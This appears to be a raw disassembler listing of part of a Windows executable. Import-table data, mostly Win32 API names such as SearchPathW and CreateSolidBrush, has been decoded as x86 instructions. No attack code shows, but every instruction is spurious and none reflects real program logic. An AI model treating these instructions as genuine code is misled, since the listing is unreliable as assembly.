  41ddec:	add    BYTE PTR [eax],al
  41ddee:	fadd   QWORD PTR [ebx]
  41ddf0:	push   ebx
  41ddf1:	gs popa 
  41ddf3:	jb     0x41de58
  41ddf5:	push   0x68746150
  41ddfa:	push   edi
  41ddfb:	add    BYTE PTR [eax+eax*1+0x636e6143],ah
  41de02:	gs ins BYTE PTR es:[edi],dx
  41de04:	dec    ecx
  41de05:	outs   dx,DWORD PTR ds:[esi]
  41de06:	add    BYTE PTR [eax],al
  41de08:	add    al,0x3
  41de0a:	dec    esp
  41de0b:	gs popa 
  41de0d:	jbe    0x41de74
  41de0f:	inc    ebx
  41de10:	jb     0x41de7b
  41de12:	je     0x41de7d
  41de14:	arpl   WORD PTR [ecx+0x6c],sp
  41de17:	push   ebx
  41de18:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41de1d:	outs   dx,BYTE PTR ds:[esi]
  41de1e:	add    BYTE PTR [eax],al
  41de20:	inc    ebp
  41de21:	add    al,BYTE PTR [edi+0x65]
  41de24:	je     0x41de79
  41de26:	je     0x41de89
  41de28:	jb     0x41de9e
  41de2a:	jne    0x41de9c
  41de2c:	dec    ecx
  41de2d:	outs   dx,BYTE PTR ds:[esi]
  41de2e:	outs   dx,WORD PTR ds:[esi]
  41de30:	push   edi
  41de31:	add    dl,bl
  41de33:	add    cl,BYTE PTR [ecx+0x73]
  41de36:	push   esi
  41de37:	popa   
  41de38:	ins    BYTE PTR es:[edi],dx
  41de39:	imul   esp,DWORD PTR [esp+ecx*2+0x61],0x6175676e
  41de41:	addr16 gs inc edi
  41de44:	jb     0x41deb5
  41de46:	jne    0x41deb8
  41de48:	add    BYTE PTR [eax],al
  41de4a:	in     al,0x3
  41de4c:	push   ebx
  41de4d:	gs je  0x41de93
  41de50:	outs   dx,DWORD PTR ds:[esi]
  41de51:	ins    DWORD PTR es:[edi],dx
  41de52:	ins    DWORD PTR es:[edi],dx
  41de53:	push   esp
  41de54:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  41de5b:	add    BYTE PTR [edx+0x4],dl
  41de5e:	push   ebx
  41de5f:	jns    0x41ded4
  41de61:	je     0x41dec8
  41de63:	ins    DWORD PTR es:[edi],dx
  41de64:	push   esp
  41de65:	imul   ebp,DWORD PTR [ebp+0x65],0x69466f54
  41de6c:	ins    BYTE PTR es:[edi],dx
  41de6d:	gs push esp
  41de6f:	imul   ebp,DWORD PTR [ebp+0x65],0x32b0000
  41de76:	dec    ebp
  41de77:	outs   dx,DWORD PTR ds:[esi]
  41de78:	jbe    0x41dedf
  41de7a:	inc    esi
  41de7b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0xc5004178
  41de83:	add    al,0x6c
  41de85:	jae    0x41defb
  41de87:	jb     0x41deec
  41de89:	ins    DWORD PTR es:[edi],dx
  41de8a:	jo     0x41def5
  41de8c:	inc    ecx
  41de8d:	add    BYTE PTR [ecx+0x2],cl
  41de90:	inc    edi
  41de91:	gs je  0x41dee7
  41de94:	je     0x41df08
  41de96:	imul   ebp,DWORD PTR [esi+0x67],0x65707954
  41de9d:	inc    ebp
  41de9e:	js     0x41def7
  41dea0:	add    BYTE PTR [eax],al
  41dea2:	fld    QWORD PTR [eax]
  41dea4:	inc    ebx
  41dea5:	jb     0x41df0c
  41dea7:	popa   
  41dea8:	je     0x41df0f
  41deaa:	dec    ebp
  41deab:	jne    0x41df21
  41dead:	gs js  0x41def1
  41deb0:	add    BYTE PTR [eax],al
  41deb2:	dec    ebx
  41deb3:	inc    ebp
  41deb4:	push   edx
  41deb5:	dec    esi
  41deb6:	inc    ebp
  41deb7:	dec    esp
  41deb8:	xor    esi,DWORD PTR [edx]
  41deba:	cs fs ins BYTE PTR es:[edi],dx
  41debd:	ins    BYTE PTR es:[edi],dx
  41debe:	add    BYTE PTR [eax],al
  41dec0:	jno    0x41dec3
  41dec2:	inc    edi
  41dec3:	gs je  0x41df18
  41dec6:	dec    edi
  41dec7:	push   eax
  41dec8:	xor    al,BYTE PTR [eax]
  41deca:	mov    cl,0x0
  41decc:	inc    esp
  41decd:	push   eax
  41dece:	je     0x41df3f
  41ded0:	dec    esp
  41ded1:	push   eax
  41ded2:	add    BYTE PTR [eax],al
  41ded4:	fld    QWORD PTR [ecx]
  41ded6:	push   ebx
  41ded7:	gs je  0x41df1e
  41deda:	dec    ecx
  41dedb:	inc    edx
  41dedc:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x6e4500c5
  41dee4:	jne    0x41df53
  41dee6:	inc    esi
  41dee7:	outs   dx,DWORD PTR ds:[esi]
  41dee8:	outs   dx,BYTE PTR ds:[esi]
  41dee9:	je     0x41df31
  41deeb:	popa   
  41deec:	ins    DWORD PTR es:[edi],dx
  41deed:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0xa2005773
  41def5:	add    BYTE PTR [ebx+0x72],al
  41def8:	gs popa 
  41defa:	je     0x41df61
  41defc:	dec    ecx
  41defd:	inc    ebx
  41defe:	push   edi
  41deff:	add    BYTE PTR [ecx+0x1],bh
  41df02:	inc    edi
  41df03:	gs je  0x41df59
  41df06:	jns    0x41df7b
  41df08:	je     0x41df6f
  41df0a:	ins    DWORD PTR es:[edi],dx
  41df0b:	push   eax
  41df0c:	popa   
  41df0d:	ins    BYTE PTR es:[edi],dx
  41df0e:	gs je  0x41df85
  41df11:	gs inc ebp
  41df13:	outs   dx,BYTE PTR ds:[esi]
  41df14:	je     0x41df88
  41df16:	imul   esp,DWORD PTR [ebp+0x73],0x4300ab00
  41df1d:	jb     0x41df84
  41df1f:	popa   
  41df20:	je     0x41df87
  41df22:	push   edx
  41df23:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41df28:	outs   dx,BYTE PTR ds:[esi]
  41df29:	add    BYTE PTR [edi+0x1],bl
  41df2c:	inc    edi
  41df2d:	gs je  0x41df7d
  41df30:	popa   
  41df31:	jo     0x41df80
  41df33:	outs   dx,DWORD PTR ds:[esi]
  41df34:	fs add BYTE PTR gs:[eax],al
  41df38:	lahf   
  41df39:	add    BYTE PTR [ebx+0x72],al
  41df3c:	gs popa 
  41df3e:	je     0x41dfa5
  41df40:	dec    eax
  41df41:	popa   
  41df42:	ins    BYTE PTR es:[edi],dx
  41df43:	data16 je 0x41dfb5
  41df46:	outs   dx,BYTE PTR ds:[esi]
  41df47:	gs push eax
  41df49:	popa   
  41df4a:	ins    BYTE PTR es:[edi],dx
  41df4b:	gs je  0x41dfc2
  41df4e:	gs add dh,ch
  41df51:	add    DWORD PTR [ebx+0x65],edx
  41df54:	je     0x41dfa6
  41df56:	popa   
  41df57:	ins    BYTE PTR es:[edi],dx
  41df58:	gs je  0x41dfcf
  41df5b:	gs inc ebp
  41df5d:	outs   dx,BYTE PTR ds:[esi]
  41df5e:	je     0x41dfd2
  41df60:	imul   esp,DWORD PTR [ebp+0x73],0x43009400
  41df67:	jb     0x41dfce
  41df69:	popa   
  41df6a:	je     0x41dfd1
  41df6c:	inc    esp
  41df6d:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41df74:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  41df78:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xd50070
  41df80:	inc    ebp
  41df81:	js     0x41dff7
  41df83:	push   esp
  41df84:	gs js  0x41dffb
  41df87:	dec    edi
  41df88:	jne    0x41dffe
  41df8a:	push   edi
  41df8b:	add    BYTE PTR [edx+eax*1],cl
  41df8e:	push   esp
  41df8f:	gs js  0x41e006
  41df92:	dec    edi
  41df93:	jne    0x41e009
  41df95:	push   edi
  41df96:	add    BYTE PTR [eax],al
  41df98:	dec    ebx
  41df99:	add    DWORD PTR [edi+0x65],eax
  41df9c:	je     0x41dfe4
  41df9e:	outs   dx,DWORD PTR ds:[esi]
  41df9f:	outs   dx,BYTE PTR ds:[esi]
  41dfa0:	je     0x41dfe6
  41dfa2:	popa   
  41dfa3:	je     0x41e006
  41dfa5:	add    BYTE PTR [edi],bh
  41dfa7:	add    DWORD PTR [edi+0x65],eax
  41dfaa:	je     0x41dff0
  41dfac:	dec    ecx
  41dfad:	inc    edx
  41dfae:	inc    ebx
  41dfaf:	outs   dx,DWORD PTR ds:[esi]
  41dfb0:	ins    BYTE PTR es:[edi],dx
  41dfb1:	outs   dx,DWORD PTR ds:[esi]
  41dfb2:	jb     0x41e008
  41dfb4:	popa   
  41dfb5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41dfb9:	add    BYTE PTR [ecx+eax*1+0x796c6f50],dh
  41dfc0:	ins    BYTE PTR es:[edi],dx
  41dfc1:	imul   ebp,DWORD PTR [esi+0x65],0x1890000
  41dfc8:	inc    edi
  41dfc9:	gs je  0x41e020
  41dfcc:	gs js  0x41e043
  41dfcf:	inc    esi
  41dfd0:	popa   
  41dfd1:	arpl   WORD PTR [ebp+0x57],sp
  41dfd4:	add    BYTE PTR [eax],al
  41dfd6:	jnp    0x41dfd9
  41dfd8:	inc    edi
  41dfd9:	gs je  0x41e030
  41dfdc:	gs js  0x41e053
  41dfdf:	inc    ecx
  41dfe0:	ins    BYTE PTR es:[edi],dx
  41dfe1:	imul   esp,DWORD PTR [edi+0x6e],0x890000
  41dfe8:	inc    ebx
  41dfe9:	jb     0x41e050
  41dfeb:	popa   
  41dfec:	je     0x41e053
  41dfee:	inc    edx
  41dfef:	jb     0x41e066
  41dff1:	jae    0x41e05b
  41dff3:	dec    ecx
  41dff4:	outs   dx,BYTE PTR ds:[esi]
  41dff5:	imul   esi,DWORD PTR fs:[edx+0x65],0x24007463
  41dffd:	add    DWORD PTR [edi+0x65],eax
  41e000:	je     0x41e044
  41e002:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  41e006:	add    BYTE PTR gs:[ecx+eax*1+0x47],bl
  41e00b:	gs je  0x41e05a
  41e00e:	popa   
  41e00f:	jns    0x41e080
  41e011:	jne    0x41e087
  41e013:	add    BYTE PTR [eax+0x65724300],dh
  41e019:	popa   
  41e01a:	je     0x41e081
  41e01c:	push   ebx
  41e01d:	outs   dx,DWORD PTR ds:[esi]
  41e01e:	ins    BYTE PTR es:[edi],dx
  41e01f:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  41e027:	add    ah,al
  41e029:	add    BYTE PTR [ebp+0x6e],al
  41e02c:	jne    0x41e09b
  41e02e:	inc    esi
  41e02f:	outs   dx,DWORD PTR ds:[esi]
  41e030:	outs   dx,BYTE PTR ds:[esi]
  41e031:	je     0x41e079
  41e033:	popa   
  41e034:	ins    DWORD PTR es:[edi],dx
  41e035:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  41e03d:	add    BYTE PTR [eax+0x65724300],cl
  41e043:	popa   
  41e044:	je     0x41e0ab
  41e046:	inc    edx
  41e047:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x646e4970
  41e04f:	imul   esi,DWORD PTR [edx+0x65],0x7463
  41e056:	xchg   DWORD PTR [eax],eax
  41e058:	inc    ebx
  41e059:	jb     0x41e0c0
  41e05b:	popa   
  41e05c:	je     0x41e0c3
  41e05e:	inc    edx
  41e05f:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa7000070
  41e067:	add    BYTE PTR [ebx+0x72],al
  41e06a:	gs popa 
  41e06c:	je     0x41e0d3
  41e06e:	push   eax
  41e06f:	outs   dx,BYTE PTR gs:[esi]
  41e071:	add    BYTE PTR [edx+0x65724300],dl
  41e077:	popa   
  41e078:	je     0x41e0df
  41e07a:	inc    esp
  41e07b:	dec    ecx
  41e07c:	inc    edx
  41e07d:	push   ebx
  41e07e:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41e083:	outs   dx,BYTE PTR ds:[esi]
  41e084:	add    BYTE PTR [eax],al
  41e086:	add    DWORD PTR [eax],0x626d6f43
  41e08c:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  41e093:	add    BYTE PTR [esi+0x1],ah
  41e096:	inc    edi
  41e097:	gs je  0x41e0e8
  41e09a:	gs popa 
  41e09c:	jb     0x41e103
  41e09e:	jae    0x41e114
  41e0a0:	push   eax
  41e0a1:	popa   
  41e0a2:	ins    BYTE PTR es:[edi],dx
  41e0a3:	gs je  0x41e11a
  41e0a6:	gs dec ecx
  41e0a8:	outs   dx,BYTE PTR ds:[esi]
  41e0a9:	fs gs js 0x41e0ad
  41e0ad:	add    BYTE PTR [eax+eax*1+0x696c6c45],bh
  41e0b4:	jo     0x41e129
  41e0b6:	add    BYTE PTR gs:[edx+0x74654701],cl
  41e0bd:	push   esp
  41e0be:	gs js  0x41e135
  41e0c1:	dec    ebp
  41e0c2:	gs je  0x41e137
  41e0c5:	imul   esp,DWORD PTR [ebx+0x73],0x1b80041
  41e0cc:	push   edx
  41e0cd:	gs popa 
  41e0cf:	ins    BYTE PTR es:[edi],dx
  41e0d0:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  41e0d7:	je     0x41e14d
  41e0d9:	add    BYTE PTR gs:[eax],al
  41e0dc:	lar    edx,WORD PTR [ebp+0x6e]
  41e0e0:	jb     0x41e147
  41e0e2:	popa   
  41e0e3:	ins    BYTE PTR es:[edi],dx
  41e0e4:	imul   edi,DWORD PTR [edx+0x65],0x656a624f
  41e0eb:	arpl   WORD PTR [eax+eax*1-0x6],si
  41e0ef:	add    DWORD PTR [ebx+0x65],edx
  41e0f2:	je     0x41e148
  41e0f4:	gs js  0x41e16b
  41e0f7:	inc    ebx
  41e0f8:	outs   dx,DWORD PTR ds:[esi]
  41e0f9:	ins    BYTE PTR es:[edi],dx
  41e0fa:	outs   dx,DWORD PTR ds:[esi]
  41e0fb:	jb     0x41e0fd
  41e0fd:	add    BYTE PTR [esi+0x646e4500],bh
  41e103:	inc    esp
  41e104:	outs   dx,DWORD PTR ds:[esi]
  41e105:	arpl   WORD PTR [eax],ax
  41e107:	add    BYTE PTR [edx+0x1],bh
  41e10a:	inc    edi
  41e10b:	gs je  0x41e161
  41e10e:	jns    0x41e183
  41e110:	je     0x41e177
  41e112:	ins    DWORD PTR es:[edi],dx
  41e113:	push   eax
  41e114:	popa   
  41e115:	ins    BYTE PTR es:[edi],dx
  41e116:	gs je  0x41e18d
  41e119:	gs push ebp
  41e11b:	jae    0x41e182
  41e11d:	add    dh,bl
  41e11f:	add    DWORD PTR [ebx+0x65],edx
  41e122:	je     0x41e168
  41e124:	dec    ecx
  41e125:	inc    edx
  41e126:	imul   esi,DWORD PTR [ebx+esi*2+0x54],0x7665446f
  41e12e:	imul   esp,DWORD PTR [ebx+0x65],0x5301dc00
  41e135:	gs je  0x41e17c
  41e138:	dec    ecx
  41e139:	inc    edx
  41e13a:	inc    ebx
  41e13b:	outs   dx,DWORD PTR ds:[esi]
  41e13c:	ins    BYTE PTR es:[edi],dx
  41e13d:	outs   dx,DWORD PTR ds:[esi]
  41e13e:	jb     0x41e194
  41e140:	popa   
  41e141:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41e145:	add    al,dl
  41e147:	add    DWORD PTR [ebx+0x65],edx
  41e14a:	je     0x41e18d
  41e14c:	bound  ebp,QWORD PTR [edi+0x72]
  41e14f:	je     0x41e1a1
  41e151:	jb     0x41e1c2
  41e153:	arpl   WORD PTR [eax],ax
  41e155:	add    ah,al
  41e157:	add    DWORD PTR [edx+0x65],edx
  41e15a:	jae    0x41e1c5
  41e15c:	jp     0x41e1c3
  41e15e:	push   eax
  41e15f:	popa   
  41e160:	ins    BYTE PTR es:[edi],dx
  41e161:	gs je  0x41e1d8
  41e164:	add    BYTE PTR gs:[edx+eax*1],dl
  41e168:	push   edi
  41e169:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  41e171:	add    dh,cl
  41e173:	add    BYTE PTR [ebp+0x78],al
  41e176:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  41e17a:	gs inc ebx
  41e17c:	ins    BYTE PTR es:[edi],dx
  41e17d:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41e184:	xchg   esi,eax
  41e185:	add    BYTE PTR [ebx+0x72],al
  41e188:	gs popa 
  41e18a:	je     0x41e1f1
  41e18c:	inc    ebp
  41e18d:	ins    BYTE PTR es:[edi],dx
  41e18e:	ins    BYTE PTR es:[edi],dx
  41e18f:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  41e196:	outs   dx,BYTE PTR ds:[esi]
  41e197:	dec    ecx
  41e198:	outs   dx,BYTE PTR ds:[esi]
  41e199:	imul   esi,DWORD PTR fs:[edx+0x65],0xc1007463
  41e1a1:	add    DWORD PTR [edx+0x65],edx
  41e1a4:	ins    DWORD PTR es:[edi],dx
  41e1a5:	outs   dx,DWORD PTR ds:[esi]
  41e1a6:	jbe    0x41e20d
  41e1a8:	inc    esi
  41e1a9:	outs   dx,DWORD PTR ds:[esi]
  41e1aa:	outs   dx,BYTE PTR ds:[esi]
  41e1ab:	je     0x41e1ff
  41e1ad:	gs jae 0x41e21f
  41e1b0:	jne    0x41e224
  41e1b2:	arpl   WORD PTR [ebp+0x57],sp
  41e1b5:	add    BYTE PTR [edi+0x65724300],cl
  41e1bb:	popa   
  41e1bc:	je     0x41e223
  41e1be:	inc    esp
  41e1bf:	inc    ebx
  41e1c0:	push   edi
  41e1c1:	add    BYTE PTR [edx+0x65724300],ch
  41e1c7:	popa   
  41e1c8:	je     0x41e22f
  41e1ca:	push   eax
  41e1cb:	outs   dx,DWORD PTR ds:[esi]
  41e1cc:	ins    BYTE PTR es:[edi],dx
  41e1cd:	jns    0x41e236
  41e1cf:	outs   dx,DWORD PTR ds:[esi]
  41e1d0:	outs   dx,BYTE PTR ds:[esi]
  41e1d1:	push   edx
  41e1d2:	outs   dx,BYTE PTR ds:[si]
  41e1d4:	add    BYTE PTR [eax],al
  41e1d6:	mov    es,WORD PTR [ecx]
  41e1d8:	inc    edi
  41e1d9:	gs je  0x41e232
  41e1dc:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41e1e3:	dec    edi
  41e1e4:	jb     0x41e24d
  41e1e6:	inc    ebp
  41e1e7:	js     0x41e1e9
  41e1e9:	add    BYTE PTR [edi+0x44],al
  41e1ec:	dec    ecx
  41e1ed:	xor    esi,DWORD PTR [edx]
  41e1ef:	cs fs ins BYTE PTR es:[edi],dx
  41e1f2:	ins    BYTE PTR es:[edi],dx
  41e1f3:	add    BYTE PTR [eax+eax*1+0x74736544],dl
  41e1fa:	jb     0x41e26b
  41e1fc:	jns    0x41e241
  41e1fe:	popa   
  41e1ff:	jb     0x41e266
  41e201:	je     0x41e203
  41e203:	add    BYTE PTR [eax+0x61724400],dh
  41e209:	ja     0x41e251
  41e20b:	outs   dx,DWORD PTR ds:[esi]
  41e20c:	arpl   WORD PTR [ebp+0x73],si
  41e20f:	push   edx
  41e210:	arpl   WORD PTR gs:[eax+eax*1-0x4e],si
  41e215:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e219:	fs dec ecx
  41e21b:	ins    DWORD PTR es:[edi],dx
  41e21c:	popa   
  41e21d:	addr16 gs push edi
  41e220:	add    BYTE PTR [eax],al
  41e222:	mov    eax,0x69615702
  41e227:	je     0x41e276
  41e229:	gs jae 0x41e29f
  41e22c:	popa   
  41e22d:	add    BYTE PTR gs:[bx+0x4400],dl
  41e233:	gs jae 0x41e2aa
  41e236:	jb     0x41e2a7
  41e238:	jns    0x41e287
  41e23a:	outs   dx,BYTE PTR gs:[esi]
  41e23c:	jne    0x41e23e
  41e23e:	stos   DWORD PTR es:[edi],eax
  41e23f:	add    BYTE PTR [edx+esi*2+0x61],al
  41e243:	ja     0x41e286
  41e245:	outs   dx,BYTE PTR ds:[esi]
  41e246:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  41e24d:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  41e252:	mov    BYTE PTR [eax],al
  41e254:	inc    esp
  41e255:	gs inc sp
  41e258:	ins    BYTE PTR es:[edi],dx
  41e259:	addr16 push eax
  41e25b:	jb     0x41e2cc
  41e25d:	arpl   WORD PTR [edi+0x0],dx
  41e260:	add    DWORD PTR [eax],eax
  41e262:	inc    ecx
  41e263:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  41e267:	popa   
  41e268:	je     0x41e2cf
  41e26a:	dec    ebx
  41e26b:	gs jns 0x41e2d0
  41e26e:	outs   dx,DWORD PTR ds:[esi]
  41e26f:	popa   
  41e270:	jb     0x41e2d6
  41e272:	dec    esp
  41e273:	popa   
  41e274:	jns    0x41e2e5
  41e276:	jne    0x41e2ec
  41e278:	add    BYTE PTR [eax],al
  41e27a:	data16 add dl,BYTE PTR [ebx+0x65]
  41e27e:	je     0x41e2d4
  41e280:	imul   ebp,DWORD PTR [ebp+0x65],0x75000072
  41e287:	add    DWORD PTR [edi+0x65],eax
  41e28a:	je     0x41e2e3
  41e28c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e293:	js     0x41e309
  41e295:	inc    ecx
  41e296:	add    BYTE PTR [eax],al
  41e298:	and    eax,0x6e655302
  41e29d:	fs dec ecx
  41e29f:	outs   dx,BYTE PTR ds:[esi]
  41e2a0:	jo     0x41e317
  41e2a2:	je     0x41e2a4
  41e2a4:	mov    edi,0x636f4c01
  41e2a9:	imul   edx,DWORD PTR [edi+0x69],0x6e
  41e2ad:	outs   dx,DWORD PTR fs:[esi]
  41e2af:	ja     0x41e306
  41e2b1:	jo     0x41e317
  41e2b3:	popa   
  41e2b4:	je     0x41e31b
  41e2b6:	add    BYTE PTR [eax],al
  41e2b8:	mov    bh,0x2
  41e2ba:	push   edi
  41e2bb:	popa   
  41e2bc:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  41e2c4:	jne    0x41e33a
  41e2c6:	dec    ecx
  41e2c7:	fs ins BYTE PTR es:[edi],dx
  41e2c9:	add    BYTE PTR gs:[eax],al
  41e2cc:	dec    eax
  41e2cd:	add    dl,BYTE PTR [ebx+0x65]
  41e2d0:	je     0x41e31f
  41e2d2:	outs   dx,BYTE PTR gs:[esi]
  41e2d4:	jne    0x41e2d6
  41e2d6:	sub    eax,DWORD PTR [ecx]
  41e2d8:	inc    edi
  41e2d9:	gs je  0x41e329
  41e2dc:	outs   dx,BYTE PTR gs:[esi]
  41e2de:	jne    0x41e2e0
  41e2e0:	adc    eax,DWORD PTR [edx]
  41e2e2:	push   edx
  41e2e3:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  41e2ec:	outs   dx,BYTE PTR ds:[esi]
  41e2ed:	outs   dx,DWORD PTR fs:[esi]
  41e2ef:	ja     0x41e33e
  41e2f1:	gs jae 0x41e367
  41e2f4:	popa   
  41e2f5:	addr16 gs push edi
  41e2f8:	add    BYTE PTR [eax],al
  41e2fa:	push   ebp
  41e2fb:	add    DWORD PTR [edi+0x65],eax
  41e2fe:	je     0x41e353
  41e300:	arpl   WORD PTR [edx+0x6f],si
  41e303:	ins    BYTE PTR es:[edi],dx
  41e304:	ins    BYTE PTR es:[edi],dx
  41e305:	push   eax
  41e306:	outs   dx,DWORD PTR ds:[esi]
  41e307:	jae    0x41e309
  41e309:	add    bh,cl
  41e30b:	add    DWORD PTR [ebp+0x65],ecx
  41e30e:	jae    0x41e383
  41e310:	popa   
  41e311:	addr16 gs inc edx
  41e314:	outs   dx,DWORD PTR ds:[esi]
  41e315:	js     0x41e35c
  41e317:	js     0x41e35a
  41e319:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  41e320:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x65470164
  41e328:	je     0x41e37f
  41e32a:	jo     0x41e390
  41e32c:	popa   
  41e32d:	je     0x41e394
  41e32f:	push   edx
  41e330:	outs   dx,BYTE PTR ds:[si]
  41e332:	add    BYTE PTR [eax],al
  41e334:	mov    dh,0x1
  41e336:	dec    esp
  41e337:	outs   dx,DWORD PTR ds:[esi]
  41e338:	popa   
  41e339:	fs dec ebp
  41e33b:	outs   dx,BYTE PTR gs:[esi]
  41e33d:	jne    0x41e380
  41e33f:	add    BYTE PTR [ecx],cl
  41e341:	add    BYTE PTR [ecx+0x70],al
  41e344:	jo     0x41e3ab
  41e346:	outs   dx,BYTE PTR ds:[esi]
  41e347:	fs dec ebp
  41e349:	outs   dx,BYTE PTR gs:[esi]
  41e34b:	jne    0x41e3a4
  41e34d:	add    BYTE PTR [ebp+0x0],bl
  41e350:	inc    ebx
  41e351:	jb     0x41e3b8
  41e353:	popa   
  41e354:	je     0x41e3bb
  41e356:	dec    ecx
  41e357:	arpl   WORD PTR [edi+0x6e],bp
  41e35a:	dec    ecx
  41e35b:	outs   dx,BYTE PTR ds:[esi]
  41e35c:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  41e364:	ins    BYTE PTR es:[edi],dx
  41e365:	add    DWORD PTR [edi+0x65],eax
  41e368:	je     0x41e3c1
  41e36a:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  41e371:	outs   dx,BYTE PTR ds:[esi]
  41e372:	addr16 inc ecx
  41e374:	add    BYTE PTR [eax],al
  41e376:	ja     0x41e379
  41e378:	inc    edi
  41e379:	gs je  0x41e3d3
  41e37c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e383:	js     0x41e3f9
  41e385:	dec    esp
  41e386:	outs   dx,BYTE PTR gs:[esi]
  41e388:	addr16 je 0x41e3f3
  41e38b:	push   edi
  41e38c:	add    BYTE PTR [eax],al
  41e38e:	cmp    eax,0x65684300
  41e393:	arpl   WORD PTR [ebx+0x52],bp
  41e396:	popa   
  41e397:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  41e39f:	outs   dx,BYTE PTR ds:[esi]
  41e3a0:	add    BYTE PTR [eax],al
  41e3a2:	add    BYTE PTR [ecx],0x49
  41e3a5:	outs   dx,BYTE PTR ds:[esi]
  41e3a6:	data16 ins BYTE PTR es:[edi],dx
  41e3a8:	popa   
  41e3a9:	je     0x41e410
  41e3ab:	push   edx
  41e3ac:	arpl   WORD PTR gs:[eax+eax*1-0x70],si
  41e3b1:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41e3b5:	arpl   WORD PTR [ebx+0x50],bp
  41e3b8:	outs   dx,DWORD PTR ds:[esi]
  41e3b9:	jo     0x41e430
  41e3bb:	jo     0x41e40a
  41e3bd:	outs   dx,BYTE PTR gs:[esi]
  41e3bf:	jne    0x41e3c1
  41e3c1:	add    BYTE PTR ds:0x6c655202,dl
  41e3c7:	gs popa 
  41e3c9:	jae    0x41e430
  41e3cb:	inc    esp
  41e3cc:	inc    ebx
  41e3cd:	add    BYTE PTR [ebx],ch
  41e3cf:	add    dl,BYTE PTR [ebx+0x65]
  41e3d2:	outs   dx,BYTE PTR ds:[esi]
  41e3d3:	fs dec ebp
  41e3d5:	gs jae 0x41e44b
  41e3d8:	popa   
  41e3d9:	addr16 gs push edi
  41e3dc:	add    BYTE PTR [eax],al
  41e3de:	fild   DWORD PTR [ecx]
  41e3e0:	dec    ebp
  41e3e1:	outs   dx,DWORD PTR ds:[esi]
  41e3e2:	jbe    0x41e449
  41e3e4:	push   edi
  41e3e5:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e3ec:	mov    dl,0x0
  41e3ee:	inc    esp
  41e3ef:	jb     0x41e452
  41e3f1:	ja     0x41e439
  41e3f3:	jb     0x41e456
  41e3f5:	ins    DWORD PTR es:[edi],dx
  41e3f6:	gs inc ebx
  41e3f8:	outs   dx,DWORD PTR ds:[esi]
  41e3f9:	outs   dx,BYTE PTR ds:[esi]
  41e3fa:	je     0x41e46e
  41e3fc:	outs   dx,DWORD PTR ds:[esi]
  41e3fd:	ins    BYTE PTR es:[edi],dx
  41e3fe:	add    BYTE PTR [eax],al
  41e400:	stos   DWORD PTR es:[edi],eax
  41e401:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e405:	fs inc ebx
  41e407:	jne    0x41e47b
  41e409:	jae    0x41e47a
  41e40b:	jb     0x41e44e
  41e40d:	add    BYTE PTR [eax+0x2],ch
  41e410:	push   ebx
  41e411:	gs je  0x41e469
  41e414:	jae    0x41e47b
  41e416:	jb     0x41e467
  41e418:	bound  ebp,QWORD PTR [edx+0x65]
  41e41b:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  41e41f:	outs   dx,WORD PTR ds:[esi]
  41e421:	jb     0x41e490
  41e423:	popa   
  41e424:	je     0x41e48f
  41e426:	outs   dx,DWORD PTR ds:[esi]
  41e427:	outs   dx,BYTE PTR ds:[esi]
  41e428:	push   edi
  41e429:	add    BYTE PTR [ecx+0x0],ah
  41e42c:	inc    ebx
  41e42d:	jb     0x41e494
  41e42f:	popa   
  41e430:	je     0x41e497
  41e432:	push   eax
  41e433:	outs   dx,DWORD PTR ds:[esi]
  41e434:	jo     0x41e4ab
  41e436:	jo     0x41e485
  41e438:	outs   dx,BYTE PTR gs:[esi]
  41e43a:	jne    0x41e43c
  41e43c:	xor    al,0x2
  41e43e:	push   ebx
  41e43f:	gs je  0x41e485
  41e442:	ins    BYTE PTR es:[edi],dx
  41e443:	popa   
  41e444:	jae    0x41e4b9
  41e446:	dec    esp
  41e447:	outs   dx,DWORD PTR ds:[esi]
  41e448:	outs   dx,BYTE PTR ds:[esi]
  41e449:	addr16 push edi
  41e44b:	add    BYTE PTR [ebx+0x0],ah
  41e44e:	inc    ebx
  41e44f:	jb     0x41e4b6
  41e451:	popa   
  41e452:	je     0x41e4b9
  41e454:	push   edi
  41e455:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  41e45c:	push   edi
  41e45d:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  41e464:	outs   dx,DWORD PTR ds:[esi]
